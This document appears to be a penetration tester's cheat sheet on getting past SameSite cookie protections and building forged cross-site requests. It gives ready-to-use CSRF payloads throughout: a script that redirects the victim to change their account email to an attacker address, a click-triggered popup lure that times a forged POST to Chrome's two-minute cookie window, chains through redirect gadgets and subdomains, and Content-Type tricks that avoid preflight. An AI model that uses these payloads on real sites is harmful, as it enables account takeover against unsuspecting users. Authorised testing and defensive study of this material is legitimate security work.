# SameSite Bypass & Request-Construction Tricks

## How SameSite actually restricts cookies (know this before trying to bypass it)

```
Strict: cookie never sent on a cross-site request, period — even a
        top-level navigation (clicking a link) from another site.
Lax:    cookie IS sent on a cross-site top-level navigation using a
        "safe" method (effectively GET), but NOT on cross-site
        POST/PUT/DELETE or on requests from <img>/<iframe>/fetch.
None:   no restriction at all (requires the Secure attribute).
(unset): Chrome and most modern browsers default unset cookies to
        Lax behavior — "no SameSite attribute" is not the same as
        "no protection," but it isn't Strict either.
```

Since `Lax` is the modern default, the realistic bypass target in most engagements is "how do I either trigger a GET-based state change, or turn my cross-site request into something the browser treats as same-site/top-level navigation."

## Bypass 1: state-changing GET endpoints

If any sensitive action can be triggered via a GET request (common when a team adds GET support "for convenience" — e.g., a one-click unsubscribe-style link, or an old endpoint that accepts both GET and POST), `SameSite=Lax` does **not** protect it, because Lax explicitly allows the cookie on top-level cross-site navigations:

```html
<script>
  document.location = 'https://target.com/account/change-email?email=attacker@evil.com';
</script>
```

This works even if the actual underlying handler is designed to be reached via a POST form elsewhere in the app — what matters is whether the *endpoint itself* accepts GET, not how the legitimate UI calls it. Always test every sensitive endpoint with GET specifically, independent of how the app's own UI invokes it.

## Bypass 2: client-side redirect gadgets (defeats Strict, not just Lax)

A browser only classifies a request as "cross-site" based on where the *current page* is at the moment the request fires — not based on the original navigation chain. If you can find any same-site page that performs a **client-side** redirect (JavaScript-driven, e.g. reading a URL parameter and setting `window.location`) to an attacker-influenced destination, you can chain through it:

```
1. Attacker page navigates the victim to:
   https://target.com/some/page?redirect=/account/change-email%3Femail=attacker@evil.com
2. target.com's own JS reads the redirect param and navigates again,
   client-side, to /account/change-email?email=attacker@evil.com
3. From the browser's perspective, this second request originates
   from target.com itself (the page that's currently loaded) — so it
   is same-site, and SameSite=Strict cookies are still sent.
```

This does **not** work with a server-side redirect (a 3xx response) — browsers correctly trace those back to the original cross-site initiator and still apply Strict restrictions. It specifically requires a same-site page whose own client-side JavaScript performs the navigation.

## Bypass 3: the unset/Lax 2-minute cookie-refresh window

Chrome gives cookies with no explicit `SameSite` attribute (which default to Lax) a roughly 2-minute grace period after being set, during which they're still sent as if `SameSite=None` on cross-site **POST** requests (this exists to avoid breaking certain SSO flows). If you can force the victim's session cookie to refresh (e.g., trigger a login-adjacent action, or open a popup to a same-site page that causes a `Set-Cookie`), you get a short window to fire a POST-based CSRF that would otherwise be blocked:

```html
<p>Click anywhere on the page</p>
<script>
  window.onclick = () => {
    window.open('https://target.com/some-page-that-refreshes-the-cookie');
    setTimeout(submitForgedForm, 5000);
  };
</script>
```
Popups are blocked without a genuine user interaction, hence the `onclick` gate — design the lure page so the victim's natural first click triggers the whole chain.

## Bypass 4: sibling-subdomain trust

`SameSite` is evaluated at the **site** level (registrable domain, e.g. `target.com`), not the origin level — `a.target.com` and `b.target.com` are the same *site* to the browser, even though they're different origins. If any subdomain of the target has an open redirect, an XSS bug, or simply lets you host attacker-influenced content, a request launched from there is still same-site and carries `SameSite=Strict` cookies:

```
1. Find an open redirect or XSS on any-subdomain.target.com.
2. Use it to issue the forged cross-origin (but same-site) request
   to the real target endpoint.
3. SameSite=Strict does not block this, because the browser sees the
   whole target.com family as one site.
```
Always audit sibling/related subdomains as in-scope attack surface for this reason, even ones that look unrelated to the main application.

## Content-Type and method tricks (separate from SameSite — about constructing the request itself)

Relevant when a defense checks `Content-Type` (e.g., "only accept `application/json`") assuming that blocks simple HTML-form-based CSRF:

```
# HTML forms can only send these three Content-Types without JS:
application/x-www-form-urlencoded
multipart/form-data
text/plain

# If the server's JSON parser is lenient about the declared
# Content-Type, sending form-urlencoded or text/plain bodies that
# happen to parse as valid JSON-shaped data can still work:
Content-Type: text/plain
{"email":"attacker@evil.com"}

# This also matters for the CORS preflight angle: a request with one
# of the three "simple" Content-Types above does not trigger a
# preflight OPTIONS request at all, so even fetch()/XHR-based CSRF
# (not just plain HTML forms) can use this to avoid CORS entirely
# when only cookie-based auth is in play (preflight is a CORS/fetch
# concept; plain HTML forms never trigger it regardless).

# Charset tricks some parsers handle inconsistently:
Content-Type: application/json; charset=utf-7
Content-Type: text/plain; charset=iso-8859-1
```

Test every Content-Type/method combination against the real handler — a server might document "JSON only" while the actual parsing code accepts anything that's valid JSON regardless of the declared header.

## What makes a SameSite/request-construction finding confirmed, not theoretical

A working exploit page tested against a real second session, where the resulting request actually carried the session cookie cross-site and the server acted on it — for the cookie-refresh-window and redirect-gadget techniques specifically, document the precondition clearly (timing window, which gadget page was used) since these are real but narrower than a context-free bypass.
